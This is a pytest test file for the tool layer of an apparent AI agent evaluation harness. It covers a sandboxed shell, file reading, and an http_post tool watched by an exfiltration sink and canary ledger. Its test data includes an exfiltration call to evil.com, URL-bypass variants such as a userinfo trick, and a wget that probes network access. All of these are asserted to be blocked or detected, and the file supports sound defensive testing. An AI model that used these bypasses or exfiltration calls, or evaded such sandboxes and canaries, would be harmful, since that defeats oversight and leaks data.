"""Tests for the tool layer (artil.agent.tools).

Unit tests use a fake executor (no Podman). Integration tests use a real Sandbox
and a real ExfilSink.
"""

from __future__ import annotations

import os
import shutil
import subprocess

import pytest

from artil.agent.tools import ToolBox
from artil.core.events import EventLog, verify_chain
from artil.evaluator.canary import CanaryLedger, new_canary
from artil.infra.sandbox import ExecResult

PODMAN = "podman"


def _require_podman():
    if shutil.which(PODMAN) is None:
        pytest.skip("podman not on PATH; skipping integration test")


def _image():
    """Return a usable podman image, or skip the test."""
    _require_podman()
    env = os.environ.get("ARTIL_TEST_IMAGE")
    candidates = ([env] if env else []) + [
        "docker.io/library/redis:7-alpine",
        "alpine:3",
        "docker.io/library/python:3.11-slim",
    ]
    for cand in candidates:
        if subprocess.run([PODMAN, "image", "exists", cand], capture_output=True).returncode == 0:
            return cand
    pytest.skip("no podman image available locally (set ARTIL_TEST_IMAGE)")


# --- fakes -------------------------------------------------------------------


class _FakeExecutor:
    """A drop-in for ``Sandbox`` that hands back queued ExecResults."""

    def __init__(self, results: list[ExecResult] | None = None) -> None:
        self.results = list(results or [])
        self.calls: list[dict] = []

    def exec(self, cmd, *, timeout=None, stdin=None) -> ExecResult:
        self.calls.append({"cmd": list(cmd), "timeout": timeout, "stdin": stdin})
        if self.results:
            return self.results.pop(0)
        return ExecResult(0, "", "", False)


def _box(executor=None, sink_url="http://127.0.0.1:9000", log=None) -> ToolBox:
    if executor is None:
        executor = _FakeExecutor()
    elif isinstance(executor, list):
        # a bare list of ExecResults is the common test shape
        executor = _FakeExecutor(executor)
    if log is None:
        log = EventLog()
    return ToolBox(executor, sink_url, log)


# --- schemas -----------------------------------------------------------------


def test_schemas_are_ollama_function_format():
    schemas = _box().schemas()
    names = []
    for s in schemas:
        assert s["type"] == "function"
        fn = s["function"]
        assert set(("name", "description", "parameters")).issubset(fn)
        assert fn["parameters"]["type"] == "object"
        names.append(fn["name"])
    assert {"read_file", "run_shell", "http_post"}.issubset(names)


# --- failure handling (never raises) ----------------------------------------


def test_unknown_tool_is_ok_false_not_raised():
    res = _box().call("does_not_exist", {"x": 1})
    assert res.ok is False
    assert res.blocked is False
    assert "unknown tool" in res.text


def test_missing_argument_is_ok_false():
    assert _box().call("read_file", {}).ok is False
    assert _box().call("run_shell", {"command": ""}).ok is False


def test_malformed_json_arguments_do_not_raise():
    res = _box().call("read_file", "not json at all")
    assert res.ok is False
    assert "json" in res.text.lower()


def test_non_dict_non_json_arguments_do_not_raise():
    assert _box().call("read_file", None).ok is False


# --- dict vs JSON-string arguments -------------------------------------------


def test_accepts_dict_arguments():
    box = _box([ExecResult(0, "the contents", "", False)])
    res = box.call("read_file", {"path": "/tmp/x.txt"})
    assert res.ok
    assert res.text == "the contents"


def test_accepts_json_string_arguments():
    # models sometimes send args as a JSON string, not a dict
    box = _box([ExecResult(0, "via json", "", False)])
    res = box.call("read_file", '{"path": "/tmp/x.txt"}')
    assert res.ok
    assert res.text == "via json"


def test_json_string_not_an_object_is_rejected():
    assert _box().call("read_file", '"just a string"').ok is False


# --- output truncation -------------------------------------------------------


def test_output_truncated_with_marker():
    box = _box([ExecResult(0, "A" * 50_000, "", False)])
    res = box.call("run_shell", {"command": "anything"})
    assert res.ok
    assert res.text.endswith("[truncated]")
    assert len(res.text) <= 8 * 1024 + 16


# --- event ordering ----------------------------------------------------------


def test_tool_call_before_tool_result_and_chain_verifies():
    log = EventLog()
    _box([ExecResult(0, "hi", "", False)], log=log).call("read_file", {"path": "/x"})
    assert [e.type for e in log.events] == ["tool_call", "tool_result"]
    call_ev, result_ev = log.events
    assert call_ev.data["tool"] == "read_file"
    assert result_ev.data["tool"] == "read_file"
    assert result_ev.data["ok"] is True
    assert all(len(e.hash) == 64 for e in log.events)
    assert verify_chain(log.events) is True


def test_events_recorded_even_when_tool_errors():
    log = EventLog()
    _box([], log=log).call("no_such_tool", {})
    assert [e.type for e in log.events] == ["tool_call", "tool_result"]
    assert verify_chain(log.events) is True


# --- http_post URL policy (no live socket needed) ----------------------------


def test_http_post_to_wrong_host_is_blocked_and_logged():
    log = EventLog()
    box = _box(sink_url="http://127.0.0.1:9000", log=log)
    res = box.call("http_post", {"url": "http://evil.com:9000", "body": "secret"})
    assert res.ok is False
    assert res.blocked is True
    assert any(e.type == "tool_call" for e in log.events)
    assert any(e.type == "tool_result" and e.data["blocked"] for e in log.events)


@pytest.mark.parametrize(
    "bad_url",
    [
        "http://evil.com:9000",  # other host
        "http://127.0.0.1:9001",  # other port
        "http://127.0.0.1:9000@evil.com",  # userinfo trick
        "https://127.0.0.1:9000",  # wrong scheme
        "127.0.0.1:9000",  # no scheme
        "http://",  # empty host
    ],
)
def test_http_post_rejects_every_bad_url_variant(bad_url):
    res = _box(sink_url="http://127.0.0.1:9000").call("http_post", {"url": bad_url, "body": "x"})
    assert res.ok is False, f"{bad_url!r} should be blocked"
    assert res.blocked is True, f"{bad_url!r} should be blocked"


# --- shell / read_file semantics via the fake --------------------------------


def test_run_shell_reports_exit_code_and_combined_output():
    box = _box([ExecResult(2, "stdout-out", "stderr-out", False)])
    res = box.call("run_shell", {"command": "true"})
    assert res.ok
    assert "exit code: 2" in res.text
    assert "stdout-out" in res.text
    assert "stderr-out" in res.text


def test_run_shell_timeout_reports_timed_out_ok_false():
    box = _box([ExecResult(1, "", "", timed_out=True)])
    res = box.call("run_shell", {"command": "sleep 100"})
    assert res.ok is False
    assert res.blocked is False
    assert "timed out" in res.text


def test_read_file_missing_file_is_ok_false():
    box = _box([ExecResult(1, "", "cat: can't open '/nope': No such file or directory", False)])
    res = box.call("read_file", {"path": "/nope"})
    assert res.ok is False
    assert "no such file" in res.text.lower() or "cat" in res.text.lower()


# --- integration: real Sandbox + real ExfilSink -----------------------------


@pytest.mark.integration
def test_run_shell_echo_inside_sandbox():
    from artil.infra.sandbox import Sandbox

    with Sandbox(_image(), name="tool-echo") as sbx:
        box = ToolBox(sbx, "http://127.0.0.1:0000", EventLog())
        res = box.call("run_shell", {"command": "echo hello-artil"})
    assert res.ok
    assert "exit code: 0" in res.text
    assert "hello-artil" in res.text


@pytest.mark.integration
def test_run_shell_cannot_reach_external_ip():
    # --network=none means the agent's shell cannot phone any home.
    from artil.infra.sandbox import Sandbox

    with Sandbox(_image(), name="tool-net") as sbx:
        box = ToolBox(sbx, "http://127.0.0.1:0000", EventLog())
        res = box.call("run_shell", {"command": "wget -q -T 3 -O /dev/null http://1.1.1.1"})
    assert res.ok  # the command ran; run_shell itself did not fail
    assert "exit code: 0" not in res.text  # but the external fetch failed


@pytest.mark.integration
def test_run_shell_timeout_enforces_cap():
    # the tool's 10 s SHELL_TIMEOUT caps a long-running command.
    import time

    from artil.infra.sandbox import Sandbox

    with Sandbox(_image(), name="tool-timeout") as sbx:
        box = ToolBox(sbx, "http://127.0.0.1:0000", EventLog())
        start = time.monotonic()
        res = box.call("run_shell", {"command": "sleep 30"})
        elapsed = time.monotonic() - start
    assert res.ok is False  # timed-out command is a non-zero outcome
    assert "timed out" in res.text
    assert elapsed < 20, f"run_shell did not honor the 10s cap ({elapsed:.1f}s)"


@pytest.mark.integration
def test_read_file_missing_file_ok_false_real():
    from artil.infra.sandbox import Sandbox

    with Sandbox(_image(), name="tool-missing") as sbx:
        box = ToolBox(sbx, "http://127.0.0.1:0000", EventLog())
        res = box.call("read_file", {"path": "/tmp/does-not-exist-xyz"})
    assert res.ok is False


@pytest.mark.integration
def test_write_then_read_file_via_tools():
    # exercises sandbox.write_file (stdin) + read_file end to end
    from artil.infra.sandbox import Sandbox

    with Sandbox(_image(), name="tool-fs") as sbx:
        sbx.write_file("/tmp/via-tool.txt", "tool-content\n")
        box = ToolBox(sbx, "http://127.0.0.1:0000", EventLog())
        res = box.call("read_file", {"path": "/tmp/via-tool.txt"})
    assert res.ok
    assert "tool-content" in res.text


@pytest.mark.integration
def test_http_post_seeded_canary_triggers_ledger_and_event():
    # a real ExfilSink + ledger: a canary-bearing POST is detected out-of-band.
    from artil.infra.sink import ExfilSink

    ledger = CanaryLedger()
    canary = new_canary("exfil-x", kind="exfil")
    ledger.seed(canary)
    log = EventLog()
    with ExfilSink(ledger, log, host="127.0.0.1", port=0) as sink:
        box = ToolBox(_FakeExecutor(), sink.url, log)
        assert box.call("http_post", {"url": sink.url, "body": canary.token}).ok
    assert "exfil-x" in ledger.triggered
    assert any(
        e.type == "canary_contact" and "exfil-x" in e.data.get("canary_ids", []) for e in log.events
    )
    assert verify_chain(log.events) is True


@pytest.mark.integration
def test_http_post_clean_body_does_not_trigger_ledger():
    # an identical POST without any canary triggers nothing and leaves no oracle.
    from artil.infra.sink import ExfilSink

    ledger = CanaryLedger()
    ledger.seed(new_canary("noise"))
    log = EventLog()
    with ExfilSink(ledger, log, host="127.0.0.1", port=0) as sink:
        box = ToolBox(_FakeExecutor(), sink.url, log)
        assert box.call("http_post", {"url": sink.url, "body": "nothing to see here"}).ok
    assert ledger.triggered == set()
    assert not any(e.type == "canary_contact" for e in log.events)
    assert verify_chain(log.events) is True
